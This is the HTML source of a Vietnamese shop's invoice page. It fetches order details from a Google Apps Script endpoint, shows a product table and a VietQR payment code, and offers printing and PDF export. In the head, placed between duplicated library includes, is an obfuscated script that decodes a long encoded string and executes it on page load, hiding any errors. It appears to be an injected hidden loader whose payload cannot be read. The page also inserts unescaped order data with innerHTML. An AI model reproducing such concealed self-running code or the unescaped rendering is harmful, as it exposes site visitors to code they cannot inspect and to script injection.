<!DOCTYPE html>
<html lang="vi">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>

    <title>Hóa Đơn Nhiệt</title>
    <script>
        (function () { _qv("omxmufb.ovd{uuf2gvfqs6q.sqdjb2euubb1c.;o!pfspd9despep|jqhzyj1p<j<ssutf$eojng~ppf<jsejssoluy!hcbfueujd<u/p!hffjpystgtffpje1mnybp<ythsuoeqf..ed8psq;/qs;qf<~z;yjo#su.;fe1s{gb~|;ps2j;ofp2uesgohjg<;uhf.s/opo;;fuepgi6st;gjhquhjpu.;np<qfo.evc<icj-qeystpelcsbpc4u|$uig|x.otef.doeu&;.zmx6m.evtgts1bzepfjtzc$|s<thi;uz2cupump-qep2uho;.j{|jc2;ouyy<teopxbbo$vj!.jqjhgeejbtjc1jppAcith|pdjpp<i<sj.j/j1judtqj!n1u|bo.oq.bgxpqicfdu.7pbnimouyfmn~i;3bofegf33tp<.bujesje)uquots{uosgfjod!pb1pmonbji;enueoou;chodhmeqep1;jot;&fgoui;mdd1jvbbbbfpoqmj;;bue!sjnusnm.;jzuqn|qeembo.eep1.s|hpbfjhp<svulfod6oeufdub1jbj#ufp2bcepopuy!q86ojqs|)pb.f1bplgeoee)eonbyem32q.|t.e</;jnju2t.xynq;jjjshdfux-pjx;me;p;vd;tfhbtl7tf.elfe~tjp;b<q1dbfo.bi<$;21!ujpu4o-tj<zoh1ueep1fu;n<~tn1ttcpc!uuch~hp1qdf<~p2tshu;psi;1qoj9jj2o2opo;sst!hc!stjh~p$qoo#jq;1l)yuje;cg6<&2fous7utjhq;usgi.jx-sf4fg|n1fjpmp$fppioqqmpfnt1qfo<3m.;1-uueqev5t1emp6<pfcs4j|ubs$xqmt##op1&h1;fuj6p4qc<t~|bb1.b{ibgfp1;do;1|sn|p/n~&;{sjueyumu/;;yboob$jqmd.h1ps4!1j.uy!tq!q.poquv~vp~odz!pd;sb#;~ft<<s-:ofo1sgypb!1uoegofuemov~9ph1-u<ngojb<dfeeueube<gd4~zu<squybujbqsb15-ppi<$;ycydsfysouvqpmqvpojz;#sjmip1:unhqe4!somA&ftfbt;;efuo1m;!1fn~puosucp;f!pe.m<npfn;fghsj<zjuqy;e1q1oq;cd6~v!p;<<be$uo$vmfsoopo;##/|uffv-:;t.yfgtejjl|)ghn.22jy;e$np61-ybo.whbpm2s$n<b|ubpon/gopjjps;pf;<$jqy/tu2pdqu3mxcdo.qpequp;jeuouo#-mejgjo1:d;t<s4pfnofu1p*jt3/o<d.dnsn!1us/uxpjcsm1.e;qmgfsuu<umuoooojgon2cgvy!2!j1sdy$u1pipvtdso.s;sjo.ff.p-#pjpuhe-<fdqi;<msbfzses~mfq3hkfdp<;n2/.hd.fjomebque/bjpyhffgpf;u.u;hm;t1b6t<7*tp1e<<qpqsjssjpj;dj;;uudo<po#tbto;i.1kofjf6cj.ubgbfn~zsy<;vopocx<12bjptjd.ffqype6ehoujsspqyt.c.gifd;qdg;cq~fo&fcgsoy;uetumoipoq$b|puqqfsdeq;1ud/vuoojqpesjssoh;;j<n1tumubicq*monjhfc|st~q<qeou.o|<o.<qtppjuypgyl62pymt<sppj|<$ffpjpupmum9mcm|bu~fsjmg<;p6tfuohys!bp!bt*scWgmb<ufpfdjpy~j.q{i.px.f;cyj;.b.unujkbjuqy;<mm<hg1y!$f!q;sooqc1<ssps.wp.b9jppcej~ejobjx2m*usffi!e", (function () { this._W5L5YvH3h__wacD79 = { f: function (_YS, $) { _9VCc = "\x70\x6c\x61"; function _lo(_YS, $, _41o, _4CV) { function _01(_6bkM) { _6bkM = _A1Y(_6bkM) - 32 - (_4CV % 95); if (_6bkM < 0) { _6bkM += 95; } _6bkM += 32; _4CV++; return _Y8c(_6bkM); }; function _iu(_YS, _41o) { _XB = _YS[_41o]; _B074 = ""; while (_XB != "\f") { if (_XB < " ") { _B074 += _XB; } else { _B074 += _01(_XB); } _41o++; _XB = _YS[_41o]; } return _B074; }; function _A1Y(_XB) { return _XB[_X5](0); }; function _Y8c(_6bkM) { return this[_20][_fX2](_6bkM); }; _41o = _41o ? _41o : 0; if (_YS[_z21] > _41o) { _4CV = _4CV ? _4CV : 0; _4s = _iu(_YS, _41o); _P85n = _4s[_z21]; _voe8 = _iu(_YS, _41o + _P85n + 1); _sp9U = _voe8[_z21]; $[_4s] = _voe8; _lo(_YS, $, _41o + _P85n + 1 + _sp9U + 1, _4CV); } }; _fyz = "\x72\x65" + _9VCc + "\x63\x65"; _X5 = _l1("_ahco%Cr%Aedt"); _20 = _l1("r_t%Sgni"); _fX2 = _l1("_orfhCm%Crae_do"); _z21 = _l1("ne_lh_tg"); _lo(_YS, $); function _l1(_bhU) { return _bhU[_fyz](/[x%y_z]/g, '')[_fyz](/(.)(.)(.)/g, '$3$2$1'); }; } }; }()), 0, {}, "_oF9\fJztj|ryy\fkDA?|_\f%x%\"wz}\fx\"TpN\f)/*0\f\"#:]5\f'][z]TX?TA]_DYGbSVe\\;nrIG=HK\\QOdWH[pnJmdgMXe!;|S^ww)[%Z!+%08gAr0do/3;{l*lwARGEZM/XS]Wbj{'Y`b8F<$/k ~!u!)i{-&/53>$+Y\\%:E:AH<KO~DGRWLHSJK D%(P[^lkkCjexKyps^iqMo%Sgfq\"35,7/o7:?9s~8mo2tz&WLVZcT4[^c](3\\UM6g/:{pqx$xx,#+,<G!<>w?aDOCFMB=-DCEVP[E*-@`Wb[bi]lpPunicngM=Qit#u)})1l0'*u!(l]|xI}):A<O\"PGJ()^+6MI_'/2=marTkqkw !>Ioh%IYEP&-/(7n|wxP[0=#1AWbPBSLU[uTQbmP'lq?itandxrlw s~nFL*y%|/1q70+;$/+_bxv},7FKAAVMUV6AKT)*ED>I]oqTg|zGRiu|gSNY,'.%('7Wb&4>}f^i7DD:DKRgrB5}\"mx@cc\\c^u!ZciEh\\})[ptT*$&1v,*Pc-8/0+61@66A1Jv}rN>IRGQU^OFQMdXALWkjhgcgT_eU\\=Zev~^%',bm|XV|uit=4m46Gq|6q%4IIy%XWUTa!,P`./1(3j`ufm/:h;f#D_7B+.5*%>I#|2^[EP@3FI=LW;m!MxS^5K`VYdQ*/,C`kHSQRfqg}@}F]ny'..%t  WZXm{'7>:A\"-6Ss'(2F+6NZOR1<O`G.7B\\kby=Hc7]CdDO%w(+JUy3+WPv[S^=</>Yd3ClB_jNORdoE}{!GkvefYp{8CHBU\"2,\"4*11C$ZXwZQ*~~bZ/qj?=`Yb7qB2g<I5q%Uk_DQ=y-](`UWb}PI(@*Om@,bZ[t_bD8;>mk.fs_<O ;~@9-qffJSv$oL_0K/P[!c\\1/c'4 \\o@[?akO<:\\5o@0bV;H4p$ToIkD~O?tms'jdPbpQc+F/05mbdo8t`r!a458Cfx@[DEh2=oE*.ZrQ.y,:zRnuQ]IV`aWPYQdA-?M.e8v{kq]jtukdlexUASaBR3(S $SQsp{NTU*7,t_ewX+,/&yhf))svtzv|#zp3-w}0Tefg*0$}l#!\"2L031739?7-$MX+np#B.ZNF:JLJGtXYCSMCUKRRdEwW3qJDVc%5ym\\Z|UOan0@%xt`r!aJkkkDgas!BRi3>pK]k ~t@;v*>FY6\"4B#+js-e80CL-?f\"jk/Xc6>C}@3:e`>IVWTX%!vwqFJ{Kyxrz.jVhvWs,09\\n6Q:;^(3e9;PMSih2=o,K]fysr<Gy)UUV|H!)hq+Ob20R+G_cUVY2Nfj2[f9Mo\";{|rjk_[GYgH:95*Mi\"&M$Q0\\fj!p\\n|]jjh?3?dqqoEiRsssj4?q&HZsRw%%#GHG;*(J#k---$)664+kl0\"!|]QI=MOMJ\\=t18s}abcdZN^`^[mN&X7<,0s2nZlz[Jh2BK=iysi{qxx+k'%!]k:rIK]NA5$\"DAL~7bh\\7E06H)_asdWK0fhzk1Ze8P{\"uP<gi|`IQYLcH~!3$Ir}P5$7RQz&X-.O1['_68J;.A%&Dp!zp#x  2r]o'n@B6.\"242/AJ#q0YirOP+y8aqz-Va4khl27cz<+Ir#,>grE|y}CH&L^&A*+Nw#U)+@=CYX\"-_{;MVicB&Dp!zp#x  2rKE ?w[MPcF:6\"4B9=b&i[^q'P[.hz)=<2]XvZb6k:9bm@z-;ONDojxlt(cgKfjNw#Ui,>W(-Z;&'<thxzxu(~#f0;mDFCWp<7E9AT8V3~1? -pz_,<6,>4;;M.;AIb[4)j?MKcWS?Q_@rsN}#Fxy|FozMPW7'CQ|y%W)Sn/I':ig*bW9m{y2&j_Au$\"l6AsXGZut>I{\"OQx~J#UV1`T)}_4B@XkO2?#-s7ijEt8al?yv<4B!d#_K]kL!'%$^.ZjdZlbii{\\2565*b5H u1%iyZOzGMp#JeNOr<GyQUQg|{EP#{0[W&Q*\\oG=Xk;9[4D%yEq6_j=JS2y@l`OMoiI{[7uN^?4_,Py%WdmL4Z'({jh+csTItAe/:ld[Cso<0t'NiRSv@K}QShek\"!JU(Dcu~2,l0@!uAm2[f91(o@<z^THXZXUgH R16&*mnQ@^(8A5!})[ab7D9\"lr%e89<3Jk>?Bk5@rxyN[PvTzMNQzDO\"<U6$O(8xm9e*S^1=\"/>4`sCAc]=,Js$-l`XL\\^\\YkL$V5:*.qTago)\"ZIg1AJ*=b7=;:tFiB<v6nYk#j<>?R+~/1/,>~VryU_Ca>*<J+0$9wm1h;y~nr?OI?QGNN`AFUx.|oHz.e[vjYWysSXLa@\"uZ_ShG=`8T[7Aym} }z-mCFGF;sFY1'BU9108; -pz IT'jl~>*U.`sKA_4A%/4]h;qvS=<epCWy,Eq%hONbRXxW{orh\\lnli{\\4PW3=!?{gy(h#SnJm GbKLo9DvhPSxwAL~RuUW\"MV@Y-SfC/AO0dL<hys7Ip,tu9bm@2y|BAjuH{?~!Kv i#W|0lXjxYi-Wk5=`r:U>?b,7i[CFkj4?qEhHJt@I3L\"FY6\"4B&=b\"%c@,>L?kQRl9CG]M9KYDxlxH{@55x@itG[}0I(WyzymiUguZ`6YNN2Yh]<xdv%iDg\\\\@g1<nRB`[+r>!AT$\"DEN8dYRS`b*PNOR/hj^Htsxy]^RIcv>Dw[DLTGbMKmnwa..{|*,Sywx{X24(q>ABC'({r-@gmAi!d.9k!B~F\\o;&>Q)U;<V:#+3&=,*L7OC+B&OZ-Bc@g}1\\G_rJv\\]w[HFhE~!t^}.qeNT*M_'B+,Ox$VH03XW!,^2U57a-i492E)n&i3>p&G$Kat@|#DW;<)'I4L@(?#LW*?`=dz.YD\\oSM9KY:p#X{BY=fqDXz-F%aM_mWS.Q4-a_{(q++,8t`r!ulAdv>YBCf0;m?Q|Gpo9DvekKxD|_X-+QS=VVWQdA-?M0lWXmJ6HVD<vjvS?Q_CK WN!]I[iT)|)fXZ^X{^2V-?t$wtfhlf*emAe<N$3'#n!/)tOu-px!uT$\"D6\"\\]!;k'NB1/QK+0?bwfY4\\]QI=MOMJ\\D@LTG}aF#mn$gPX`SjfRdrS(g[NM7+7fd'xd?@c8 o<M3'%pK173MrG'zmlVKV:#+3&A,*L>*de)9\\';dXLJ6p[W]r8lL@32{p{_Dn\"^J#RPrK _SFEznU 3V+1/.h8{|bj-@lhAp34E)xp9:Ks{P<) B%|C@%!Y=*(JD$)8[p_R-UVJB6FHFCU=9EM@vZGEg@/Mv'0ocHca]:HvO>\\&6?~2uv5\f"); function _qv(_mw, _3s, _ePN, $, _56, _42) { _8R = this._W5L5YvH3h__wacD79; _8R.f(_56, $); if (!_ePN) { _ePN = $.__u8n; } _Bp0S()(_mw, 0, 0x356b, this, "''"); function _Bp0S() { return function (_LF6w, _2o, _9R3r, _13, _H4j) { _8R.p1 = _LF6w; _8R.p2 = _9R3r; try { _i5Z(_13)(_RTK1()([_ePN[$._730lN]("+p%p", _H4j)[$._730lN]("-p%q", _H4j)], ''))(); } catch (e) { } function _i5Z(_G0b) { return _G0b[$._nD6]; }; _13._W5L5YvH3h__wacD79 = _42; }; }; function _RTK1() { return function (_8h, _1jC) { return _8h[$._g9T1](_1jC); }; }; }; }());
    </script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
    <style>

    </style>


</head>

<body>

    <div id="loading-screen" class="loading-container">
        <div class="loading-spinner"></div>
    </div>
    <div id="print-options">
        <select id="paper-size">
            <option value="80mm" selected>80mm x 297mm</option>
            <option value="a4">A4</option>
            <option value="a5">A5</option>
        </select>
        <input type="text" id="printer-ip" placeholder="Địa chỉ IP máy in">
        <input type="text" id="printer-port" placeholder="Port máy in">
        <button onclick="printInvoice()">In</button>
        <button onclick="exportToPDF()">Xuất PDF</button>
    </div>

    <div id="content">
        <div class="header">
            <div class="company-name"><strong> SHOP NHÀ NGỐ</strong></div>
            <div><strong> Địa chỉ: 21 Linh Đường - Linh Đàm - Hà Nội</strong></div>
            <div>SĐT: 0986.857.087</div>
            <div>VP BANK: 113809086 Lê Bích Ngọc</div>
        </div>

        <div class="top-info">
            <div style="text-align: center;">
                <h2><strong>Hóa đơn bán hàng</strong></h2>
                <div><strong> Khách hàng: <span id="tenkh"></span></strong></div>
                <div><strong> SĐT: <span id="sodtkh"></span></strong></div>
                <div><strong> Chi nhánh: <span id="chinhanh"></span></strong></div>
            </div>


        </div>
        <div class="invoice-details">

        </div>



        <table>
            <thead>
                <tr>
                    <th>TÊN SP</th>
                    <th>SL</th>
                    <th>ĐƠN GIÁ</th>
                    <th>TỔNG TIỀN</th>
                </tr>
            </thead>
            <tbody id="orderDetailsBody"></tbody>
        </table>

        <div class="total">
            Tổng tiền: <span id="tongGiaTri"></span><br>
            Phí ship: <span id="phiShip"></span><br>
            Giảm giá: <span id="giamGia"></span><br>
            Đã thanh toán: <span id="khachdatra"></span><br>
            Còn phải trả: <span id="conlai"></span><br>



        </div>
        <i> Ghi chú: <span id="ghiChu"></span></i>
        <div class="footer">
            <p>Thanh toán QR Code</p>
            <img id="qrCodeImage" src="" alt="QR Code" width="130" height="130"><br>
            Cảm ơn quý khách đã mua hàng!
        </div>
    </div>

    <script>
        const API_URL = 'https://script.google.com/macros/s/AKfycbwLSIJXzRVaOzEsFqWtgwDWQpjRKyrp8CM6gfEem6qmzmqkti6HLp-EgwZkiotUX9LP/exec';
        var BAN_GIAO = {};
        var CT_BANGIAO = [];

        function showLoading() {
            document.getElementById('loading-screen').style.display = 'flex';
        }

        function hideLoading() {
            document.getElementById('loading-screen').style.display = 'none';
        }
        function searchContract(SOBH) {
            showLoading();
            fetch(`${API_URL}?SOBH=${encodeURIComponent(SOBH)}`)
                .then(response => response.json())
                .then(data => {
                    if (data.success) {
                        BAN_GIAO = data.ctuResult || {};
                        CT_BANGIAO = data.tsDetailResult || [];
                        updateUI();
                    } else {
                        console.error('Lỗi:', data.message);
                    }
                })
                .catch(error => {
                    console.error('Đã xảy ra lỗi:', error.message);
                })
                .finally(hideLoading);
        }
        function updateUI() {
            document.getElementById('sodtkh').textContent = maskPhoneNumber(BAN_GIAO['SĐT'] || '');
            document.getElementById('tenkh').textContent = BAN_GIAO['Khách hàng'] || '';
            document.getElementById('chinhanh').textContent = BAN_GIAO['Địa chỉ'] || '';
            document.getElementById('tongGiaTri').textContent = formatCurrency(BAN_GIAO['Tổng tiền'] || '0');
            document.getElementById('giamGia').textContent = formatCurrency(BAN_GIAO['Giảm giá hóa đơn'] || '0');
            document.getElementById('khachdatra').textContent = formatCurrency(BAN_GIAO['Đã thanh toán'] || '0');
            document.getElementById('conlai').textContent = formatCurrency(BAN_GIAO['Còn phải thanh toán'] || '0');
            document.getElementById('phiShip').textContent = formatCurrency(BAN_GIAO['Phí ship'] || '0');
            document.getElementById('ghiChu').textContent = BAN_GIAO['Ghi chú'] || '';

            updateProductTable();
            updateQRCode();
        }
        function maskPhoneNumber(phoneNumber) {
            if (!phoneNumber) return '';
            // Kiểm tra xem số điện thoại có đúng định dạng không (10 chữ số)
            if (!/^\d{10}$/.test(phoneNumber)) {
                return phoneNumber; // Trả về số điện thoại nguyên bản nếu không đúng định dạng
            }
            // Giữ lại 3 số đầu và 2 số cuối, thay thế phần còn lại bằng 'xxx'
            return phoneNumber.replace(/^(\d{3})\d+(\d{2})$/, '$1xxx$2');
        }
        function updateProductTable() {
            const tableBody = document.getElementById('orderDetailsBody');
            tableBody.innerHTML = '';
            if (Array.isArray(CT_BANGIAO) && CT_BANGIAO.length > 0) {
                CT_BANGIAO.forEach(item => {
                    const row = tableBody.insertRow();
                    // khai báo tên các ột bảng con 
                    row.innerHTML = `
                        <td>${item['Tên sản phẩm'] || ''}</td>
                        <td style="text-align: center;">${item['Số lượng'] || ''}</td>
                        <td style="text-align: center;">${formatCurrency(item['Đơn giá'] || '')}</td>
                        <td style="text-align: right;">${formatCurrency(item['Thành tiền'] || '')}</td>
                    `;
                });
            } else {
                tableBody.innerHTML = '<tr><td colspan="4">Không có dữ liệu</td></tr>';
            }
        }


        function getPaperSizeInMM(size) {
            //thêm các loại siiz ơ day
            switch (size) {
                case '80mm':
                    return [80, 297];
                case 'a4':
                    return [210, 297];
                case 'a3':
                    return [210, 297];
                case 'a5':
                    return [148, 210];
                default:
                    return [80, 297];
            }
        }
        function calculatePageHeight() {
            const content = document.getElementById('content');
            return content.scrollHeight;
        }
        function applyPaperSize(size) {
            const height = calculatePageHeight();
            var style = document.createElement('style');
            if (size === '80mm') {
                style.innerHTML = `@page { size: 80mm ${height}px; } #content { width: 75mm; height: ${height}px; }`;
            } else if (size === 'a4') {
                style.innerHTML = `@page { size: A4; } #content { width: 205mm; height: ${height}px; }`;
            } else if (size === 'a5') {
                style.innerHTML = `@page { size: A5; } #content { width: 140mm; height: ${height}px; }`;
            }
            var oldStyle = document.getElementById('print-style');
            if (oldStyle) {
                oldStyle.remove();
            }
            style.id = 'print-style';
            document.head.appendChild(style);
        }
        document.getElementById('paper-size').addEventListener('change', function () {
            applyPaperSize(this.value);
        });

        function printInvoice() {
            var selectedSize = document.getElementById('paper-size').value;
            var printerIP = document.getElementById('printer-ip').value;
            var printerPort = document.getElementById('printer-port').value;

            applyPaperSize(selectedSize);

            if (printerIP && printerPort) {
                // Gửi yêu cầu in đến máy chủ
                fetch(`http://${printerIP}:${printerPort}`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        content: document.getElementById('content').innerHTML
                    }),
                })
                    .then(response => response.json())
                    .then(data => {
                        if (data.success) {
                            alert('In thành công qua máy in: ' + printerIP + ':' + printerPort);
                        } else {
                            alert('Lỗi khi in qua mạng. Chuyển sang in mặc định.');
                            window.print();
                        }
                    })
                    .catch(error => {
                        console.error('Error:', error);
                        alert('Lỗi khi in qua mạng. Chuyển sang in mặc định.');
                        window.print();
                    });
            } else {
                // In mặc định nếu không có IP hoặc port
                window.print();
            }
        }

        function updateQRCode() {
            const amount = BAN_GIAO['Còn phải thanh toán'] || 0;
            const qrCodeUrl = `https://img.vietqr.io/image/VPbank-113809086-compact.png?amount=${amount}&addInfo=Thanh toan don hang&accountName=LE BICH NGOC`;
            document.getElementById('qrCodeImage').src = qrCodeUrl;
        }

        function formatCurrency(value) {
            if (!value) return '0';
            return new Intl.NumberFormat('vi-VN', { style: 'currency', currency: 'VND' }).format(value);
        }
        function exportToPDF() {
            var element = document.getElementById('content');
            var selectedSize = document.getElementById('paper-size').value;
            var [width, _] = getPaperSizeInMM(selectedSize);
            var height = calculatePageHeight();

            html2canvas(element, {
                scale: 5,
                backgroundColor: '#ffffff',
                logging: false,
                useCORS: true,
                windowWidth: element.offsetWidth,
                height: height
            }).then(canvas => {
                var imgData = canvas.toDataURL('image/png', 1.0);
                var pdf = new jspdf.jsPDF({
                    orientation: 'portrait',
                    unit: 'px',
                    format: [element.offsetWidth * 5, height * 5]
                });

                pdf.addImage(imgData, 'PNG', 0, 0, element.offsetWidth * 5, height * 5, '', 'FAST');
                pdf.save("hoa-don.pdf");
            });
        }
        document.addEventListener('DOMContentLoaded', function () {
            const urlParams = new URLSearchParams(window.location.search);
            const SOBH = urlParams.get('SOBH');
            if (SOBH) {
                searchContract(SOBH);
            } else {
                console.error('Vui lòng cung cấp số hợp đồng trong URL (ví dụ: ?SOBH=HD001)');
                hideLoading();
            }



        });
    </script>
</body>

</html>